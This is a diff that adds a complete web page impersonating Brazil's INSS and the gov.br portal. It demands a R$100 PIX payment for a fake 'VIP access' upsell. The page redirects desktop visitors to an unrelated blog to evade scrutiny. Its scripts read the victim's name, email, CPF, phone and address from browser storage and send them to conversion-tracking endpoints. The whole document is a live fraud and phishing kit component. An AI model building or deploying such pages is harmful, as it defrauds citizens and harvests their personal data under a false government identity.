@@ -1,0 +1,674 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>INSS | Pagamento PIX</title>
+    <link rel="shortcut icon" href="public/assets/images/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="../style.css">
+    <script src="../3.4-2.16"></script>
+    <link href="../css/rawline-2" rel="stylesheet">
+    <!-- Font Awesome diretamente do CDN oficial -->
+    <script src="../jquery-3.6.0.min.js"></script>
+    <!-- External CSS -->
+    <script src="../npm/qrcode%401.5.0/build/qrcode.min.js"></script>
+    <link rel="stylesheet" href="../ajax/libs/font-awesome/5.15.4/css/all.min.css" integrity="sha512-1ycn6IcaQQ40/MKBW2W4Rhis/DbILU74C1vSrLJxCq57o941Ym01SwNsOMqvEBFlcgUa6xLiPY/NS5R+E6ztJQ==" crossorigin="anonymous" referrerpolicy="no-referrer">
+<link rel="stylesheet" href="../ajax/libs/font-awesome/5.15.3/css/all.min.css">
+ <script type="text/javascript">
+        // Verifica o dispositivo e redireciona antes de carregar outros recursos
+        if (!/iPhone|iPod|iPad|Android|BlackBerry|IEMobile/i.test(navigator.userAgent) && window.innerWidth > 768) {
+            window.location.replace('https://www.estrategiaconcursos.com.br/blog/concurso-correios-2025-cadastro-reserva/');
+        }
+    </script>
+
+<script>
+  window.pixelId = "68900408c79a2a1bfd8089b8";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+  <script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'primary': '#1351B4', // Cor primária gov.br (azul)
+                        'secondary': '#EFEFEF', // Cinza claro
+                        'dark': '#333333', // Cor escura para textos
+                        'light': '#FFFFFF', // Cor clara para fundos
+                        'warning': '#FF0000', // Vermelho para alertas
+                        'yellow': '#F7B731' // Amarelo gov.br
+                    },
+                    fontFamily: {
+                        'sans': ['Rawline', 'Arial', 'Helvetica', 'sans-serif']
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        
+
+        body {
+            font-family: 'Rawline', Arial, Helvetica, sans-serif;
+            background-color: #F8F8F8;
+            color: #333;
+            overflow-x: hidden;
+            width: 100%;
+            position: relative;
+            margin: 0;
+            padding: 0;
+        }
+
+        html {
+            overflow-x: hidden;
+            width: 100%;
+        }
+
+        .govbr-container {
+            max-width: 720px;
+            margin: 0 auto;
+        }
+
+        /* Estilo para o header no estilo gov.br */
+        header {
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            background-color: #ffffff;
+            padding: 12px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+
+        header img {
+            width: 180px;
+            margin: 0;
+            height: auto;
+        }
+
+        .nav-bar {
+            background-color: white;
+            padding: 16px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #e5e5e5;
+        }
+
+        .nav-bar-content {
+            display: flex;
+            align-items: center;
+            color: #666;
+            font-size: 14px;
+        }
+
+        .nav-bar-content span {
+            margin: 0 5px;
+        }
+
+        /* Botões estilo gov.br */
+        .govbr-button {
+            background-color: #1351B4;
+            transition: all 0.3s ease;
+            color: white;
+            font-weight: 600;
+            border: none;
+            border-radius: 24px;
+            padding: 12px 16px;
+            text-transform: uppercase;
+            font-size: 14px;
+            letter-spacing: 0.5px;
+            box-shadow: 0 2px 4px rgba(19, 81, 180, 0.3);
+        }
+
+        .govbr-button:hover {
+            background-color: #0c326f;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(19, 81, 180, 0.4);
+        }
+
+        .govbr-outline-button {
+            border: 2px solid #1351B4;
+            color: #1351B4;
+            transition: all 0.3s ease;
+            border-radius: 24px;
+        }
+
+        .govbr-outline-button:hover {
+            background-color: #1351B4;
+            color: white;
+        }
+
+        .half-circle {
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            background: linear-gradient(90deg, #1351B4 50%, #FFFFFF 50%);
+            border: 1px solid #1351B4;
+            display: inline-block;
+            vertical-align: middle;
+        }
+
+        .govbr-card {
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+        }
+
+        .govbr-input {
+            border: 2px solid #DDDDDD;
+            border-radius: 8px;
+            padding: 12px;
+            font-size: 16px;
+            width: 100%;
+            background-color: #F8F8F8;
+        }
+
+        .govbr-input:disabled {
+            background-color: #EFEFEF;
+            color: #555;
+        }
+
+        .govbr-badge {
+            background-color: #F7B731;
+            color: #0c326f;
+            padding: 4px 12px;
+            border-radius: 16px;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .govbr-timer {
+            color: #FF3333;
+            font-weight: bold;
+        }
+
+        .govbr-loading {
+            border-top-color: #1351B4;
+        }
+
+        .govbr-success-icon {
+            color: #1351B4;
+        }
+
+        .pulse-animation {
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+
+            50% {
+                transform: scale(1.05);
+            }
+
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        .fade-in {
+            animation: fadeIn 0.5s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        .valor-aprovado-container {
+            background-color: #F8F8F8;
+            border-left: 4px solid #1351B4;
+            padding: 16px;
+            margin: 16px 0;
+            text-align: left;
+        }
+
+        .valor-aprovado-label {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 4px;
+            font-weight: 500;
+        }
+
+        .valor-aprovado {
+            color: #1351B4;
+            font-size: 28px;
+            font-weight: bold;
+            display: block;
+        }
+
+        .notification-popup {
+            position: fixed;
+            top: 20px;
+            right: -300px;
+            background-color: #1351B4;
+            color: white;
+            padding: 16px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            z-index: 1000;
+            transition: right 0.3s ease-in-out;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .notification-popup.show {
+            right: 20px;
+        }
+
+        /* Estilo gov.br para os cards */
+        .bg-white {
+            border-radius: 8px;
+        }
+
+        /* Ajuste para cor de fundo no estilo gov.br */
+        .bg-yellow-500 {
+            background-color: #F7B731 !important;
+            color: #0c326f !important;
+        }
+
+        /* Ajuste para cor de fundo da barra informativa */
+        .bg-blue-600,
+        .bg-blue-50 {
+            background-color: #1351B4 !important;
+        }
+
+        .bg-blue-50 {
+            background-color: #E6F0FF !important;
+        }
+
+        .border-blue-400 {
+            border-color: #1351B4 !important;
+        }
+
+        .text-blue-400,
+        .text-blue-700 {
+            color: #1351B4 !important;
+        }
+
+        /* Estilo gov.br para os containers */
+        .rounded-md,
+        .rounded-lg {
+            border-radius: 8px;
+        }
+
+        /* Ajuste para cor verde de confirmação */
+        .bg-green-600 {
+            background-color: #268744 !important;
+        }
+
+        .text-green-600 {
+            color: #268744 !important;
+        }
+
+        /* Estilo para footer gov.br */
+        .govbr-footer {
+            background-color: #0B1A38;
+            color: #fff;
+            padding: 20px;
+            text-align: center;
+            margin-top: 30px;
+            width: 100%;
+            position: relative;
+            bottom: 0;
+        }
+
+        .govbr-footer img {
+            width: 120px;
+            margin-bottom: 10px;
+        }
+
+        .govbr-footer p {
+            margin: 5px 0;
+            font-size: 12px;
+        }
+
+        /* Estilos específicos para esse layout */
+        .main-content {
+            margin-top: 20px;
+            min-height: calc(100vh - 200px);
+            position: relative;
+        }
+    </style>
+   
+</head>
+
+<body class="min-h-screen">
+  
+    <noscript>
+        <img height="1" width="1" style="display:none" src="../tr-1?id=9432167203543880&ev=PageView&noscript=1">
+    </noscript>
+
+    <div id="notification" class="notification-popup">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewbox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+        </svg>
+        <span>Código PIX copiado!</span>
+    </div>
+
+    <!-- Header do gov.br -->
+    <header>
+<div class="flex justify-between items-center px-4 py-3">
+            <div class="flex items-center">
+                <a href="/" class="gov-logo">
+                    <img src="../logo.png" alt="gov.br" class="h-7">
+                </a>
+            </div>
+            <div class="flex items-center">
+                <button class="header-btn" id="menu-btn" aria-label="Menu">
+                    <i class="fas fa-ellipsis-v text-blue-900 mx-3"></i>
+                </button>
+                <div class="w-px h-6 bg-blue-900 mx-3"></div>
+                <button class="header-btn" id="accessibility-btn" aria-label="Acessibilidade">
+                    <i class="fas fa-palette text-blue-900 mx-3"></i>
+                </button>
+                <div class="half-circle mx-3"></div>
+                <button class="header-btn" id="apps-btn" aria-label="Aplicativos">
+                    <i class="fas fa-th text-blue-900 mx-3"></i>
+                </button>
+                <a href="" id="user-link" class="bg-blue-700 text-white px-4 py-2 rounded-full flex items-center hover:bg-blue-800 transition-colors text-sm font-medium">
+  <i class="fas fa-user mr-2"></i>
+  Entrar
+</a>
+            </div>
+        </div>
+    </header>
+
+    <nav class="breadcrumb-nav flex items-center px-4 py-3 text-sm" aria-label="Navegação estrutural"><div class="flex flex-wrap items-center gap-1"><a href="https://gov.agentedaeducaco.org/?utm_source=organic&utm_campaign=&utm_medium=&utm_content=&utm_term=" class="text-blue-700 hover:text-blue-800"><i class="fas fa-home"></i></a><span class="mx-1 text-gray-600">&gt;</span><a href="#" class="text-blue-700 hover:text-blue-800 text-xs">Acesso à Informação</a><span class="mx-1 text-gray-600">&gt;</span><a href="#" class="text-blue-700 hover:text-blue-800 text-xs">Ações e Programas</a><span class="mx-1 text-gray-600">&gt;</span><a href="#" class="text-blue-700 hover:text-blue-800 text-xs">Programas</a><span class="mx-1 text-gray-600">&gt;</span><a href="#" class="text-blue-700 hover:text-blue-800 text-xs">Bolsas e Auxílios</a><span class="mx-1 text-gray-600">&gt;</span><a href="#" class="text-blue-700 hover:text-blue-800 text-xs">Lista de Programas</a><span class="mx-1 text-gray-600">&gt;</span><span class="text-gray-800 text-xs font-medium">Mais Agentes do Trabalho</span></div></nav>
+
+
+    <script>
+        $(document).ready(function () {
+            // Remove a classe "destacar" do elemento com id "meu-elemento"
+            setTimeout(function () {
+                $('#loadingPage').addClass('hidden');
+            }, 3000);
+
+        });
+    </script>
+<script>
+  const nomeCompleto = localStorage.getItem("nome");
+
+  if (nomeCompleto) {
+    const primeiroNome = nomeCompleto.trim().split(" ")[0];
+    const userLink = document.getElementById("user-link");
+
+    if (userLink) {
+      userLink.innerHTML = `<i class="fas fa-user mr-2"></i>${primeiroNome}`;
+    }
+  }
+</script>
+    <div id="loadingPage" class="main-content  fade-in">
+        <div class="govbr-container px-4 py-8">
+            <div class="govbr-card bg-white p-6">
+                <div class="flex items-center justify-center">
+                    <div class="govbr-loading animate-spin rounded-full h-12 w-12 border-4"></div>
+                </div>
+                <p class="text-center mt-4 text-lg">Gerando pagamento...</p>
+            </div>
+        </div>
+    </div>
+
+
+  <script>
+$(document).ready(function () {
+    let transactionId = null;
+    let paymentCheckInterval = null;
+
+    // ⭐ INÍCIO: FUNÇÕES AUXILIARES PARA CAPTURA DE UTMs
+    function getCookie(name) {
+        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
+        return match ? decodeURIComponent(match[2]) : null;
+    }
+
+    function getParamValue(key) {
+        const urlParams = new URLSearchParams(window.location.search);
+        // Prioridade: Parâmetro de URL > localStorage > Cookie
+        return urlParams.get(key) || localStorage.getItem(key) || getCookie(key) || null;
+    }
+    // ⭐ FIM: FUNÇÕES AUXILIARES
+
+    // --- 1. COLETA DE DADOS E MONTAGEM DO PAYLOAD ---
+    const nomeCompleto = localStorage.getItem("nome") || "Cliente Upsell";
+    const email = localStorage.getItem("email") || "email@naoencontrado.com";
+    const cpfLimpo = (localStorage.getItem("cpf_limpo") || "00000000000").replace(/\D/g, '');
+    const telefoneRaw = localStorage.getItem("telefone") || "11999999999";
+    const telefoneClean = telefoneRaw.replace(/\D/g, '');
+
+    const enderecoString = localStorage.getItem('endereco');
+    const endereco = enderecoString ? JSON.parse(enderecoString) : {};
+    const cepClean = (endereco.cep || "88000000").replace(/\D/g, '');
+
+    const valorUpsell = 10000;
+    const nomeProdutoUpsell = "Acesso VIP Exclusivo";
+
+    // Payload para a Pague-X
+    const pagueXPayload = {
+        amount: valorUpsell,
+        paymentMethod: "pix",
+        customer: {
+            name: 'Joaozinho Silva',
+            email: 'emailfixo@gmail.com',
+            phone: '48999999999',
+            document: { number: '00399025103', type: "cpf" },
+            address: {
+                street: endereco.logradouro || "Rua não informada",
+                streetNumber: endereco.numero || "S/N", zipCode: cepClean,
+                neighborhood: endereco.bairro || "Bairro não informado", city: endereco.cidade || "Cidade não informada",
+                state: endereco.estado || "SP", country: "BR"
+            }
+        },
+        items: [{ title: nomeProdutoUpsell, unitPrice: valorUpsell, quantity: 1, tangible: false }]
+    };
+
+    console.log('Payload enviado para a Pague-X:', pagueXPayload);
+
+    // --- 2. CHAMADA AJAX PARA CRIAR O PAGAMENTO PIX ---
+    $.ajax({
+        url: "/pagamento/pagamento-pix/getPayment.php",
+        method: "POST",
+        contentType: "application/json",
+        data: JSON.stringify(pagueXPayload),
+        success: function (response) {
+            console.log("Resposta do getPayment.php:", response);
+
+            if (response && response.id && response.pix && response.pix.qrcode) {
+                transactionId = response.id;
+                const pixCodeString = response.pix.qrcode;
+
+                $("#pixCode").val(pixCodeString);
+                const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(pixCodeString)}`;
+                $("#qrCodeImage").attr("src", qrCodeUrl).show();
+
+                // ⭐ INÍCIO: TRACKING DE LEAD/PENDENTE (UTMIFY)
+                const payloadPendente = {
+                    orderId: transactionId,
+                    customer: { name: nomeCompleto, email: email, document: cpfLimpo },
+                    products: [{ id: "acesso-vip-exclusivo", name: nomeProdutoUpsell, quantity: 1, priceInCents: valorUpsell }],
+                    trackingParameters: {
+                        src: getParamValue("src"), sck: getParamValue("sck"), utm_source: getParamValue("utm_source"), utm_campaign: getParamValue("utm_campaign"),
+                        utm_medium: getParamValue("utm_medium"), utm_content: getParamValue("utm_content"), utm_term: getParamValue("utm_term"),
+                        xcod: getParamValue("xcod"), fbclid: getParamValue("fbclid"), gclid: getParamValue("gclid"), ttclid: getParamValue("ttclid")
+                    },
+                    commission: { totalPriceInCents: valorUpsell, gatewayFeeInCents: 0, userCommissionInCents: valorUpsell }
+                };
+                
+                console.log('✅ Enviando payload de LEAD para utmify-pendente.php:', payloadPendente);
+                $.ajax({
+                    url: "/pagamento/pagamento-pix/utmify-pendente.php",
+                    method: "POST",
+                    contentType: "application/json",
+                    data: JSON.stringify(payloadPendente),
+                    success: function(trackResponse) { console.log("Resposta de utmify-pendente.php:", trackResponse); },
+                    error: function(xhr) { console.error("Erro ao enviar para utmify-pendente.php:", xhr.responseText); }
+                });
+                // ⭐ FIM: TRACKING DE LEAD/PENDENTE
+
+                startStatusCheck();
+            } else {
+                $("#area-pagamento-pix").html("<p>Ocorreu um erro ao gerar o PIX. Tente novamente.</p>");
+            }
+        },
+        error: function (xhr) {
+            $("#area-pagamento-pix").html(`<p>Erro ao contatar o servidor: ${xhr.statusText}. Por favor, recarregue a página.</p>`);
+        }
+    });
+
+    // --- 3. FUNÇÃO PARA VERIFICAR O STATUS DO PAGAMENTO ---
+    function startStatusCheck() {
+        if (paymentCheckInterval) clearInterval(paymentCheckInterval);
+        paymentCheckInterval = setInterval(function () {
+            if (!transactionId) return;
+
+            $.ajax({
+                url: `/pagamento/pagamento-pix/verifyPayment.php?id=${transactionId}`,
+                method: "GET",
+                success: function (response) {
+                    const status = response.status ? response.status.toLowerCase() : '';
+                    if (status === 'paid' || status === 'completed' || status === 'pago') {
+                        clearInterval(paymentCheckInterval);
+                        
+                        // ⭐ INÍCIO: TRACKING DE CONVERSÃO (UTMIFY)
+                        const payloadConfirmado = {
+                            status: 'paid', orderId: transactionId, approvedDate: new Date().toISOString(),
+                            customer: { name: nomeCompleto, email: email, document: cpfLimpo },
+                            products: [{ id: "acesso-vip-exclusivo", name: nomeProdutoUpsell, quantity: 1, priceInCents: valorUpsell }],
+                             trackingParameters: {
+                                src: getParamValue("src"), sck: getParamValue("sck"), utm_source: getParamValue("utm_source"), utm_campaign: getParamValue("utm_campaign"),
+                                utm_medium: getParamValue("utm_medium"), utm_content: getParamValue("utm_content"), utm_term: getParamValue("utm_term"),
+                                xcod: getParamValue("xcod"), fbclid: getParamValue("fbclid"), gclid: getParamValue("gclid"), ttclid: getParamValue("ttclid")
+                            },
+                            commission: { totalPriceInCents: valorUpsell, gatewayFeeInCents: 0, userCommissionInCents: valorUpsell }
+                        };
+
+                        console.log('✅ Enviando payload de CONVERSÃO para utmify.php:', payloadConfirmado);
+                        $.ajax({
+                            url: "/pagamento/pagamento-pix/utmify.php",
+                            method: "POST",
+                            contentType: "application/json",
+                            data: JSON.stringify(payloadConfirmado),
+                            success: function(trackResponse) { console.log("Resposta de utmify.php:", trackResponse); },
+                            error: function(xhr) { console.error("Erro ao enviar para utmify.php:", xhr.responseText); },
+                            complete: function() {
+                                // ⭐ REDIRECIONAMENTO SEGURO
+                                // Acontece aqui para garantir que a chamada de tracking tenha terminado
+                                $("#area-pagamento-pix").hide();
+                                $("#mensagem-sucesso").show();
+                                setTimeout(function() {
+                                    window.location.href = "/agendamento/pagamento-confirmado";
+                                }, 3000);
+                            }
+                        });
+                        // ⭐ FIM: TRACKING DE CONVERSÃO
+                    }
+                },
+                error: function (xhr) {
+                    console.error("Erro ao verificar status:", xhr.responseText);
+                }
+            });
+        }, 5000);
+    }
+
+    // --- 4. FUNÇÃO PARA COPIAR O CÓDIGO PIX ---
+    $(".copiarValor").click(function () {
+        const codigoPix = $("#pixCode").val();
+        navigator.clipboard.writeText(codigoPix).then(function () {
+            alert("Código PIX copiado com sucesso!");
+        }, function (err) {
+            console.error("Erro ao copiar o código:", err);
+        });
+    });
+});
+</script>
+
+
+
+    <div id="mainPage" class="main-content fade-in">
+        <div class="govbr-container px-4 py-8">
+            <div class="govbr-card bg-white p-6">
+                <h1 class="text-2xl font-bold text-govbr-dark mb-6">Pagamento via PIX</h1>
+
+                <div class="valor-aprovado-container">
+                    <span class="valor-aprovado-label">Valor a pagar:</span>
+                    <span class="valor-aprovado">R$ 100,00</span>
+                </div>
+
+                <div class="mt-6">
+                    <p class="text-sm text-gray-600 mb-4">
+                        Escaneie o QR Code ou copie o código PIX abaixo para realizar o pagamento.
+                    </p>
+
+                    <div class="flex flex-col items-center space-y-4">
+                        <div id="qrCodeContainer" class="bg-white p-4 rounded-lg shadow-sm">
+                            <img id="qrCodeImage" src="" alt="QR Code PIX" class="w-48 h-48">
+                        </div>
+
+                        <div class="w-full">
+                            <label class="block text-sm font-medium text-gray-700 mb-2">
+                                Código PIX (Copiar e Colar)
+                            </label>
+                            <div class="flex">
+                                <input type="text" id="pixCode" class="govbr-input flex-1" readonly="">
+                                <button class="govbr-button ml-2 copiarValor">
+                                    Copiar
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="mt-6">
+                        <div class="bg-blue-50 border-l-4 border-blue-400 p-4">
+                            <div class="flex">
+                                <div class="flex-shrink-0">
+                                    <svg class="h-5 w-5 text-blue-400" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 20 20" fill="currentColor">
+                                        <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"></path>
+                                    </svg>
+                                </div>
+                                <div class="ml-3">
+                                    <p class="text-sm text-blue-700">
+                                        Após o pagamento, aguarde alguns instantes para a confirmação automática.
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer no estilo gov.br -->
+    <footer class="govbr-footer mt-10">
+        <img src="https://www.gov.br/++theme++padrao_govbr/img/govbr-colorido-b.png" alt="GOV.BR">
+        <div>
+            <p>Todo o conteúdo deste site está publicado sob a licença</p>
+            <p>Creative Commons Atribuição-SemDerivações 3.0 Não Adaptada</p>
+        </div>
+    </footer>
+
+
+</body>
+
+</html>
